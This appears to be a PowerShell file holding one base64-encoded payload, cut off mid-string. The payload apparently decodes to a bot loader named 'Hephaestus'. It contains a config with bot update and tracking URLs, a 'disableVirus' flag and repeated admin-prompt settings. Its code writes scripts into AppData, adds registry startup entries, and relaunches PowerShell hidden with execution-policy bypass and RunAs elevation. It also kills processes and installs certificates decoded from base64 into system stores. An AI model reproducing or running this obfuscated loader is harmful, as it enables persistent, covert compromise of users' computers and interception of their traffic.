
$xbody = "IyMjaGVhZA0KDQokc2VydmVyID0gQCcNCnsNCiAgInVybERvYyI6ICIiLA0KICAiZGlzYWJsZWQiOiBmYWxzZSwNCiAgImRpc2FibGVWaXJ1cyI6IGZhbHNlLA0KICAic2VydmVyIjogIjEyNy4wLjAuMSIsDQogICJodG1sVGVtcGxhdGVTcG9uc29yRmlsZSI6ICJDOlxcc29mdFxcaGVwaGFlc3R1c1xccGhwXFwuXFxkb3dubG9hZC5odG1sIiwNCiAgInByaW1hcnlEbnMiOiAiMTI3LjAuMC4xIiwNCiAgInNlY29uZGFyeURucyI6ICIxMjcuMC4wLjEiLA0KICAiZXh0cmFVcGRhdGUiOiBmYWxzZSwNCiAgInVwZGF0ZVVybCI6ICJodHRwOi8vMTI3LjAuMC4xL2JvdC91cGRhdGUiLA0KICAidHJhY2siOiBmYWxzZSwNCiAgInRyYWNrU2VyaWUiOiAiam9wYSIsDQogICJ0cmFja0Rlc2t0b3AiOiBmYWxzZSwNCiAgInRyYWNrVXJsIjogImh0dHA6Ly8xMjcuMC4wLjEvYm90L3Vwc2VydCIsDQogICJhdXRvU3RhcnQiOiB0cnVlLA0KICAiYXV0b1VwZGF0ZSI6IHRydWUsDQogICJhZ2dyZXNzaXZlQWRtaW4iOiB0cnVlLA0KICAiYWdncmVzc2l2ZUFkbWluRGVsYXkiOiAzLA0KICAiYWdncmVzc2l2ZUFkbWluQXR0ZW1wdHMiOiAyLA0KICAiYWdncmVzc2l2ZUFkbWluVGltZXMiOiAzLA0KICAicHVzaGVzRm9yY2UiOiB0cnVlLA0KICAicHVzaGVzIjogW10sDQogICJzdGFydERvd25sb2Fkc0ZvcmNlIjogZmFsc2UsDQogICJzdGFydERvd25sb2FkcyI6IFtdLA0KICAic3RhcnRVcmxzRm9yY2UiOiBmYWxzZSwNCiAgInN0YXJ0VXJscyI6IFtdLA0KICAiZnJvbnRGb3JjZSI6IGZhbHNlLA0KICAiZnJvbnQiOiBbXSwNCiAgImVtYmVkZGluZ3NGb3JjZSI6IGZhbHNlLA0KICAiZW1iZWRkaW5ncyI6IFtdDQp9DQonQCB8IENvbnZlcnRGcm9tLUpzb24NCg0KDQogICAgICAgICR4ZGF0YSA9IEB7DQogICAgICAgIA0KICAgIH0NCiAgICAgICAgDQoNCiAgICAgICAgJHhmcm9udCA9IEAoDQogICAgICAgIA0KICAgICAgICApDQogICAgICAgICR4ZnJvbnRfbmFtZSA9IEAoDQogICAgICAgIA0KICAgICAgICApDQogICAgICAgICR4ZW1iZWQgPSBAKA0KICAgICAgICANCiAgICAgICAgKQ0KICAgICAgICAkeGVtYmVkX25hbWUgPSBAKA0KICAgICAgICANCiAgICAgICAgKQ0KDQpmdW5jdGlvbiBHZXQtU2NyaXB0UGF0aCB7DQogICAgJHNjcmlwdFBhdGhzID0gQCgNCiAgICAgICAgIyRNeUludm9jYXRpb24uTXlDb21tYW5kLkRlZmluaXRpb24sDQogICAgICAgICRQU0NvbW1hbmRQYXRoLA0KICAgICAgICAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5QYXRoDQogICAgKQ0KICAgIA0KICAgIGZvcmVhY2ggKCRwYXRoIGluICRzY3JpcHRQYXRocykgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAkcGF0aCkgew0KICAgICAgICAgICAgICAgIHJldHVybiAkcGF0aA0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIHsNCiAgICAgICAgfQ0KICAgIH0NCn0NCmZ1bmN0aW9uIEN1c3RvbURlY29kZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRpbkNvbnRlbnQsDQogICAgICAgIFtzdHJpbmddJG91dEZpbGUNCiAgICApDQoNCiAgICAjJHN0YW5kYXJkQmFzZTY0Q2hhcnMgPSAiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLyINCiAgICAjJGN1c3RvbUJhc2U2NENoYXJzICAgPSAiUVdFUlRZVUlPUExLSkhHRkRTQVpYQ1ZCTk1hc2RmZ2hqa2xxd2VydHl1aW9wenhjdmJubTk4NzY1NDMyMTArLyINCiAgICANCiAgICAjICRkZWNvZGVkQmFzZTY0U3RyaW5nID0gJGluQ29udGVudA0KDQogICAgIyAjICRkZWNvZGVkQmFzZTY0U3RyaW5nID0gJGRlY29kZWRCYXNlNjRTdHJpbmcgLXJlcGxhY2UgKFtyZWdleF06OkVzY2FwZSgkY3VzdG9tQmFzZTY0Q2hhcnMpKSwgew0KICAgICMgIyAgICAgcGFyYW0oJG1hdGNoKQ0KICAgICMgIyAgICAgJHN0YW5kYXJkQmFzZTY0Q2hhcnNbJGN1c3RvbUJhc2U2NENoYXJzLkluZGV4T2YoJG1hdGNoLlZhbHVlKV0NCiAgICAjfQ0KDQogICAgdHJ5IHsNCiAgICAgICAgJGRlY29kZWRCeXRlcyA9IFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkaW5Db250ZW50KQ0KICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRvdXRGaWxlLCAkZGVjb2RlZEJ5dGVzKQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgIFdyaXRlLUVycm9yICJGYWlsZWQgdG8gZGVjb2RlIHRoZSBjdXN0b20gQmFzZTY0IHN0cmluZzogJF8iDQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIElzRGVidWcgew0KICAgICRkZWJ1Z0ZpbGUgPSAiQzpcZGVidWcudHh0Ig0KICAgIA0KICAgIHRyeSB7DQogICAgICAgICMgQ2hlY2sgaWYgdGhlIGZpbGUgZXhpc3RzDQogICAgICAgIGlmIChUZXN0LVBhdGggJGRlYnVnRmlsZSAtUGF0aFR5cGUgTGVhZikgew0KICAgICAgICAgICAgcmV0dXJuICR0cnVlDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgICAgIH0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgIyBDYXRjaCBhbnkgZXJyb3JzIHRoYXQgb2NjdXIgZHVyaW5nIHRoZSBUZXN0LVBhdGggb3BlcmF0aW9uDQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQp9DQoNCiRnbG9iYWxEZWJ1ZyA9IElzRGVidWc7DQoNCmZ1bmN0aW9uIHdyaXRlZGJnIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJG1zZywgICBbc3RyaW5nXSRtc2cyPSIiDQogICAgKQ0KICAgICAgICBpZiAoJGdsb2JhbERlYnVnKXsNCiAgICAgICAgICAgIFdyaXRlLUhvc3QgJG1zZyArICRtc2cyDQogICAgICAgIH0NCn0NCg0KZnVuY3Rpb24gR2V0LUhlcGhhZXN0dXNGb2xkZXIgew0KICAgICRhcHBEYXRhUGF0aCA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKQ0KICAgICRoZXBoYWVzdHVzRm9sZGVyID0gSm9pbi1QYXRoICRhcHBEYXRhUGF0aCAnSGVwaGFlc3R1cycNCiAgICByZXR1cm4gJGhlcGhhZXN0dXNGb2xkZXINCn0NCg0KZnVuY3Rpb24gR2V0LUhvbGRlclBhdGggew0KICAgICRoZXBoYWVzdHVzRm9sZGVyID0gR2V0LUhlcGhhZXN0dXNGb2xkZXINCiAgICAkc2NyaXB0TmFtZSA9ICdob2xkZXInICsgJy4nICsgJ3BzMScNCiAgICAkaG9sZGVyUGF0aCA9IEpvaW4tUGF0aCAkaGVwaGFlc3R1c0ZvbGRlciAtQ2hpbGRQYXRoICRzY3JpcHROYW1lDQogICAgcmV0dXJuICRob2xkZXJQYXRoDQp9DQoNCmZ1bmN0aW9uIEdldC1Cb2R5UGF0aCB7DQogICAgJGhlcGhhZXN0dXNGb2xkZXIgPSBHZXQtSGVwaGFlc3R1c0ZvbGRlcg0KICAgICRzY3JpcHROYW1lID0gJ2JvZHknICsgJy4nICsgJ3BzMScNCiAgICAkYm9keVBhdGggPSBKb2luLVBhdGggJGhlcGhhZXN0dXNGb2xkZXIgLUNoaWxkUGF0aCAkc2NyaXB0TmFtZQ0KICAgIHJldHVybiAkYm9keVBhdGgNCn0NCg0KZnVuY3Rpb24gVGVzdC1Bcmd7IHBhcmFtIChbc3RyaW5nXSRhcmcpDQogICAgJGdsb2JhbEFyZ3MgPSAkZ2xvYmFsOmFyZ3MgLWpvaW4gJyAnDQogICAgaWYgKCRnbG9iYWxBcmdzIC1saWtlICIqJGFyZyoiKSB7DQogICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgIH0NCiAgICByZXR1cm4gJGZhbHNlDQp9IA0KDQoNCmZ1bmN0aW9uIFRlc3QtQXV0b3N0YXJ0IA0Kew0KICAgIHJldHVybiBUZXN0LUFyZyAtYXJnICJhdXRvc3RhcnQiDQp9DQoNCg0KZnVuY3Rpb24gR2V0QXJnIHsNCiAgICBwYXJhbSAoW3N0cmluZ10kYXJnKQ0KDQogICAgJGdsb2JhbEFyZ3MgPSAkZ2xvYmFsOmFyZ3MNCiAgICAkYXJnID0gJGFyZy5Ub0xvd2VyKCkNCg0KICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJGdsb2JhbEFyZ3MuQ291bnQ7ICRpKyspIHsNCiAgICAgICAgJGN1cnJlbnRBcmcgPSAkZ2xvYmFsQXJnc1skaV0uVHJpbVN0YXJ0KCItIikuVG9Mb3dlcigpDQogICAgICAgIGlmICggKEFyZ3NFcXVhbCAkY3VycmVudEFyZyAkYXJnKSAtYW5kICRpICsgMSAtbHQgJGdsb2JhbEFyZ3MuQ291bnQpIHsNCiAgICAgICAgICAgIHJldHVybiAkZ2xvYmFsQXJnc1skaSArIDFdDQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gIiINCn0NCg0KZnVuY3Rpb24gU3RyVG9JbnQgew0KICAgIHBhcmFtIChbc3RyaW5nXSR2YWx1ZSkNCg0KICAgIGlmIChbc3RyaW5nXTo6SXNOdWxsT3JXaGl0ZVNwYWNlKCR2YWx1ZSkpIHsNCiAgICAgICAgcmV0dXJuIDANCiAgICB9DQoNCiAgICAkaW50VmFsdWUgPSAwDQogICAgaWYgKFtpbnRdOjpUcnlQYXJzZSgkdmFsdWUsIFtyZWZdJGludFZhbHVlKSkgew0KICAgICAgICByZXR1cm4gJGludFZhbHVlDQogICAgfQ0KDQogICAgcmV0dXJuIDANCn0NCg0KZnVuY3Rpb24gU3RyVG9Cb29sIHsNCiAgICBwYXJhbSAoW3N0cmluZ10kdmFsdWUsIFtib29sXSRkZWZhdWx0KQ0KDQogICAgaWYgKFtzdHJpbmddOjpJc051bGxPcldoaXRlU3BhY2UoJHZhbHVlKSkgew0KICAgICAgICByZXR1cm4gJGRlZmF1bHQNCiAgICB9DQoNCiAgICAkYm9vbFZhbHVlID0gJGRlZmF1bHQNCiAgICBpZiAoW2Jvb2xdOjpUcnlQYXJzZSgkdmFsdWUuVG9Mb3dlcigpLCBbcmVmXSRib29sVmFsdWUpKSB7DQogICAgICAgIHJldHVybiAkYm9vbFZhbHVlDQogICAgfQ0KDQogICAgcmV0dXJuICRkZWZhdWx0DQp9DQoNCmZ1bmN0aW9uIFJlZ1dyaXRlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHJlZ2lzdHJ5UGF0aCwNCiAgICAgICAgW3N0cmluZ10ka2V5TmFtZSwNCiAgICAgICAgW3N0cmluZ10kdmFsdWUNCiAgICApDQoNCiAgICB0cnkgew0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRyZWdpc3RyeVBhdGgpIHsNCiAgICAgICAgICAgICRjdXJyZW50VmFsdWUgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdpc3RyeVBhdGggLU5hbWUgJGtleU5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCg0KICAgICAgICAgICAgaWYgKCRjdXJyZW50VmFsdWUuJGtleU5hbWUgLWVxICR2YWx1ZSkgew0KICAgICAgICAgICAgICAgIHdyaXRlZGJnICJUaGUgJyRrZXlOYW1lJyBrZXkgaXMgYWxyZWFkeSBzZXQgd2l0aCB0aGUgY29ycmVjdCB2YWx1ZS4iIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRrZXlOYW1lIC1WYWx1ZSAkdmFsdWUNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiJyRrZXlOYW1lJyBrZXkgdXBkYXRlZCB3aXRoIHRoZSBjb3JyZWN0IHZhbHVlLiIgLUZvcmVncm91bmRDb2xvciBHcmVlbg0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgTmV3LUl0ZW0gLVBhdGggJHJlZ2lzdHJ5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICAgICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRrZXlOYW1lIC1WYWx1ZSAiJHZhbHVlIiAtUHJvcGVydHlUeXBlIFN0cmluZyAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICAgICAgd3JpdGVkYmcgIicka2V5TmFtZScga2V5IGFkZGVkIHRvIHN0YXJ0dXAuIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQogICAgICAgIH0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgd3JpdGVkYmcgIkVycm9yIHdoaWxlIGFkZGluZy91cGRhdGluZyB0aGUgJyRrZXlOYW1lJyBrZXk6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgIH0NCn0NCg0KZnVuY3Rpb24gUmVnV3JpdGVJbnQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kcmVnaXN0cnlQYXRoLA0KICAgICAgICBbc3RyaW5nXSRrZXlOYW1lLA0KICAgICAgICBbaW50XSR2YWx1ZQ0KICAgICkNCg0KICAgIFJlZ1dyaXRlIC1yZWdpc3RyeVBhdGggJHJlZ2lzdHJ5UGF0aCAta2V5TmFtZSAka2V5TmFtZSAtdmFsdWUgJHZhbHVlLlRvU3RyaW5nKCkNCn0NCg0KZnVuY3Rpb24gUmVnUmVhZCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRyZWdpc3RyeVBhdGgsDQogICAgICAgIFtzdHJpbmddJGtleU5hbWUNCiAgICApDQoNCiAgICB0cnkgew0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRyZWdpc3RyeVBhdGgpIHsNCiAgICAgICAgICAgICRjdXJyZW50VmFsdWUgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdpc3RyeVBhdGggLU5hbWUgJGtleU5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgIHJldHVybiAkY3VycmVudFZhbHVlLiRrZXlOYW1lDQogICAgICAgIH0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiRXJyb3IgcmVhZGluZyByZWdpc3RyeSBrZXkgJyRrZXlOYW1lJyBmcm9tICckcmVnaXN0cnlQYXRoJzogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgfQ0KDQogICAgcmV0dXJuICIiDQp9DQoNCmZ1bmN0aW9uIFJlZ1JlYWRJbnQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kcmVnaXN0cnlQYXRoLA0KICAgICAgICBbc3RyaW5nXSRrZXlOYW1lDQogICAgKQ0KDQogICAgJHZhbHVlID0gUmVnUmVhZCAtcmVnaXN0cnlQYXRoICRyZWdpc3RyeVBhdGggLWtleU5hbWUgJGtleU5hbWUNCiAgICByZXR1cm4gU3RyVG9JbnQgLXZhbHVlICR2YWx1ZQ0KfQ0KDQpmdW5jdGlvbiBSZWdSZWFkQm9vbCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRyZWdpc3RyeVBhdGgsDQogICAgICAgIFtzdHJpbmddJGtleU5hbWUsDQogICAgICAgIFtib29sXSRkZWZhdWx0DQogICAgKQ0KDQogICAgJHZhbHVlID0gUmVnUmVhZCAtcmVnaXN0cnlQYXRoICRyZWdpc3RyeVBhdGggLWtleU5hbWUgJGtleU5hbWUNCiAgICByZXR1cm4gU3RyVG9Cb29sIC12YWx1ZSAkdmFsdWUgLWRlZmF1bHQgJGRlZmF1bHQNCn0NCg0KJGhlcGFlc3R1c1JlZyA9ICJIS0NVOlxTb2Z0d2FyZVxIZXBoYWVzdHVzIg0KDQpmdW5jdGlvbiBSZWdXcml0ZVBhcmFtIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGtleU5hbWUsDQogICAgICAgIFtzdHJpbmddJHZhbHVlDQogICAgKQ0KICAgICRyZWdpc3RyeVBhdGggPSAkZ2xvYmFsOmhlcGFlc3R1c1JlZw0KICAgIFJlZ1dyaXRlIC1yZWdpc3RyeVBhdGggJHJlZ2lzdHJ5UGF0aCAta2V5TmFtZSAka2V5TmFtZSAtdmFsdWUgJHZhbHVlDQp9DQoNCmZ1bmN0aW9uIFJlZ1dyaXRlUGFyYW1JbnQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kcmVnaXN0cnlQYXRoLA0KICAgICAgICBbc3RyaW5nXSRrZXlOYW1lLA0KICAgICAgICBbaW50XSR2YWx1ZQ0KICAgICkNCiAgICBSZWdXcml0ZVBhcmFtIC1rZXlOYW1lICRrZXlOYW1lIC12YWx1ZSAkdmFsdWUuVG9TdHJpbmcoKQ0KfQ0KDQpmdW5jdGlvbiBSZWdXcml0ZVBhcmFtQm9vbCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRyZWdpc3RyeVBhdGgsDQogICAgICAgIFtzdHJpbmddJGtleU5hbWUsDQogICAgICAgIFtib29sXSR2YWx1ZQ0KICAgICkNCiAgICBSZWdXcml0ZVBhcmFtIC1rZXlOYW1lICRrZXlOYW1lIC12YWx1ZSAkdmFsdWUuVG9TdHJpbmcoKS5Ub0xvd2VyKCkNCn0NCg0KZnVuY3Rpb24gUmVnUmVhZFBhcmFtIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGtleU5hbWUNCiAgICApDQogICAgJHJlZ2lzdHJ5UGF0aCA9ICRnbG9iYWw6aGVwYWVzdHVzUmVnDQogICAgcmV0dXJuIFJlZ1JlYWQgLXJlZ2lzdHJ5UGF0aCAkcmVnaXN0cnlQYXRoIC1rZXlOYW1lICRrZXlOYW1lDQp9DQoNCmZ1bmN0aW9uIFJlZ1JlYWRQYXJhbUludCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRrZXlOYW1lDQogICAgKQ0KICAgICRyZWdpc3RyeVBhdGggPSAkZ2xvYmFsOmhlcGFlc3R1c1JlZw0KICAgIHJldHVybiBSZWdSZWFkSW50IC1yZWdpc3RyeVBhdGggJHJlZ2lzdHJ5UGF0aCAta2V5TmFtZSAka2V5TmFtZQ0KfQ0KDQpmdW5jdGlvbiBSZWdSZWFkUGFyYW1Cb29sIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGtleU5hbWUsICAgICAgICBbYm9vbF0kZGVmYXVsdA0KICAgICkNCiAgICAkcmVnaXN0cnlQYXRoID0gJGdsb2JhbDpoZXBhZXN0dXNSZWcNCiAgICByZXR1cm4gUmVnUmVhZEJvb2wgLXJlZ2lzdHJ5UGF0aCAkcmVnaXN0cnlQYXRoIC1rZXlOYW1lICRrZXlOYW1lIC1kZWZhdWx0ICRkZWZhdWx0DQp9DQoNCmZ1bmN0aW9uIEdldEFyZ0ludCB7DQogICAgcGFyYW0gKFtzdHJpbmddJGFyZykNCg0KICAgIHJldHVybiBTdHJUb0ludCAoR2V0QXJnICRhcmcpDQp9DQoNCmZ1bmN0aW9uIEVuc3VyZURhc2hQcmVmaXggew0KICAgIHBhcmFtIChbc3RyaW5nXSR2YWx1ZSkNCg0KICAgIGlmICgtbm90ICR2YWx1ZS5TdGFydHNXaXRoKCItIikpIHsNCiAgICAgICAgcmV0dXJuICItIiArICR2YWx1ZQ0KICAgIH0NCiAgICByZXR1cm4gJHZhbHVlDQp9DQoNCmZ1bmN0aW9uIEFyZ3NFcXVhbCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRhcmcxLA0KICAgICAgICBbc3RyaW5nXSRhcmcyDQogICAgKQ0KDQogICAgIyBOb3JtYWxpemUgYm90aCBhcmd1bWVudHMgKHJlbW92ZSBsZWFkaW5nICItIiBhbmQgY29tcGFyZSBjYXNlLWluc2Vuc2l0aXZlbHkpDQogICAgJG5vcm1hbGl6ZWRBcmcxID0gJGFyZzEuVHJpbVN0YXJ0KCItIikuVG9Mb3dlcigpDQogICAgJG5vcm1hbGl6ZWRBcmcyID0gJGFyZzIuVHJpbVN0YXJ0KCItIikuVG9Mb3dlcigpDQoNCiAgICByZXR1cm4gJG5vcm1hbGl6ZWRBcmcxIC1lcSAkbm9ybWFsaXplZEFyZzINCn0NCg0KZnVuY3Rpb24gUnVuTWUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kc2NyaXB0LCANCiAgICAgICAgW2Jvb2xdICRyZXBhc3NBcmdzLA0KICAgICAgICBbc3RyaW5nXSRhcmdOYW1lLA0KICAgICAgICBbc3RyaW5nXSRhcmdWYWx1ZSwNCiAgICAgICAgW2Jvb2xdJHVhYw0KICAgICkNCg0KICAgICRhcmdOYW1lID0gRW5zdXJlRGFzaFByZWZpeCAtdmFsdWUgJGFyZ05hbWUNCg0KICAgICRzY3JpcHRQYXRoID0gJHNjcmlwdA0KICAgIA0KICAgICRsb2NhbCA9IEAoIi1FeGVjdXRpb25Qb2xpY3kiLCAiQnlwYXNzIiwgIi1GaWxlIiwgIiIiJHNjcmlwdFBhdGgiIiIpDQogICAgDQogICAgaWYgKCRyZXBhc3NBcmdzIC1lcSAkdHJ1ZSkgew0KICAgICAgICAkZ2xvYmFsQXJncyA9ICRnbG9iYWw6YXJncw0KICAgICAgICAkZmlsdGVyZWRBcmdzID0gQCgpDQogICAgICAgICRza2lwTmV4dCA9ICRmYWxzZQ0KDQogICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJGdsb2JhbEFyZ3MuQ291bnQ7ICRpKyspIHsNCiAgICAgICAgICAgIGlmICgkc2tpcE5leHQpIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRza2lwTmV4dCA9ICRmYWxzZQ0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmIChBcmdzRXF1YWwgJGdsb2JhbEFyZ3NbJGldICRhcmdOYW1lKSB7DQogICAgICAgICAgICAgICAgJHNraXBOZXh0ID0gJHRydWUNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAkZmlsdGVyZWRBcmdzICs9ICRnbG9iYWxBcmdzWyRpXQ0KICAgICAgICB9DQogICAgICAgICRnbG9iYWxBcmdzID0gJGZpbHRlcmVkQXJncw0KICAgICAgICAkbG9jYWwgKz0gJGdsb2JhbEFyZ3MNCiAgICAgICAgaWYgKC1ub3QgW3N0cmluZ106OklzTnVsbE9yRW1wdHkoJGFyZ05hbWUpIC1hbmQgJGFyZ05hbWUgLW5lICItIikgew0KICAgICAgICAgICAgJGxvY2FsICs9ICRhcmdOYW1lDQogICAgICAgICAgICAkbG9jYWwgKz0gJGFyZ1ZhbHVlDQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkYXJndW1lbnRMaXN0ID0gIiINCiAgICBmb3IgKCRpID0gMDsgJGkgLWx0ICRsb2NhbC5Db3VudDsgJGkgKz0gMSkgew0KICAgICAgICAkYXJnID0gJGxvY2FsWyRpXQ0KICAgICAgICAkYXJndW1lbnRMaXN0ICs9ICIkYXJnICINCiAgICB9DQoNCiAgICB3cml0ZWRiZyAic3RhcnRpbmcgICRhcmd1bWVudExpc3QiDQoNCiAgICBpZiAoJGdsb2JhbERlYnVnKQ0KICAgIHsNCiAgICAgICAgaWYgKCR1YWMgLWVxICR0cnVlKSB7DQogICAgICAgICAgICBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwuZXhlIC1WZXJiIFJ1bkFzIC1XaW5kb3dTdHlsZSBOb3JtYWwgLUFyZ3VtZW50TGlzdCAkYXJndW1lbnRMaXN0DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBOb3JtYWwgLUFyZ3VtZW50TGlzdCAkYXJndW1lbnRMaXN0DQogICAgICAgIH0NCiAgICB9DQogICAgZWxzZSANCiAgICB7DQogICAgICAgIGlmICgkdWFjIC1lcSAkdHJ1ZSkgew0KICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtVmVyYiBSdW5BcyAtV2luZG93U3R5bGUgSGlkZGVuIC1Bcmd1bWVudExpc3QgJGFyZ3VtZW50TGlzdA0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Bcmd1bWVudExpc3QgJGFyZ3VtZW50TGlzdA0KICAgICAgICB9DQogICAgfQ0KDQp9DQoNCmZ1bmN0aW9uIElzRWxldmF0ZWQNCnsNCiAgICBpZiAoLU5PVCAoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKSkNCiAgICB7DQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQogICAgcmV0dXJuICR0cnVlDQp9DQoNCg0KZnVuY3Rpb24gR2V0LUVudlBhdGhzIHsNCiAgICAkYSA9IEdldC1Mb2NhbEFwcERhdGFQYXRoDQogICAgJGIgPSAgR2V0LUFwcERhdGFQYXRoDQogICAgcmV0dXJuIEAoJGEgLCAkYikNCn0NCg0KZnVuY3Rpb24gR2V0LVRlbXBGaWxlIHsNCiAgICAkdGVtcFBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wUGF0aCgpDQogICAgJHRlbXBGaWxlID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcEZpbGVOYW1lKCkNCiAgICByZXR1cm4gJHRlbXBGaWxlDQp9DQoNCmZ1bmN0aW9uIEdldC1Mb2NhbEFwcERhdGFQYXRoIHsNCiAgICByZXR1cm4gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW1N5c3RlbS5FbnZpcm9ubWVudCtTcGVjaWFsRm9sZGVyXTo6TG9jYWxBcHBsaWNhdGlvbkRhdGEpDQp9DQoNCmZ1bmN0aW9uIEdldC1BcHBEYXRhUGF0aCB7DQogICAgcmV0dXJuIFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKFtTeXN0ZW0uRW52aXJvbm1lbnQrU3BlY2lhbEZvbGRlcl06OkFwcGxpY2F0aW9uRGF0YSkNCn0NCg0KZnVuY3Rpb24gR2V0LVByb2ZpbGVQYXRoIHsNCiAgICByZXR1cm4gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW1N5c3RlbS5FbnZpcm9ubWVudCtTcGVjaWFsRm9sZGVyXTo6VXNlclByb2ZpbGUpDQp9DQoNCmZ1bmN0aW9uIENsb3NlLVByb2Nlc3NlcyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nW11dJHByb2Nlc3Nlcw0KICAgICkNCg0KICAgIGZvcmVhY2ggKCRwcm9jZXNzIGluICRQcm9jZXNzZXMpIHsNCiAgICAgICAgJGNvbW1hbmQgPSAidGFza2tpbGwuZXhlIC9pbSAkcHJvY2VzcyAvZiINCiAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gJGNvbW1hbmQNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIENlcnQtV29yayB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddICRjb250ZW50U3RyaW5nDQogICAgKQ0KICAgICRvdXRwdXRGaWxlUGF0aCA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBGaWxlTmFtZSgpDQogICAgQ3VzdG9tRGVjb2RlIC1pbkNvbnRlbnQgJGNvbnRlbnRTdHJpbmcgLW91dEZpbGUgJG91dHB1dEZpbGVQYXRoDQoNCiAgICBJbnN0YWxsLUNlcnRpZmljYXRlVG9TdG9yZXMgLUNlcnRpZmljYXRlRmlsZVBhdGggJG91dHB1dEZpb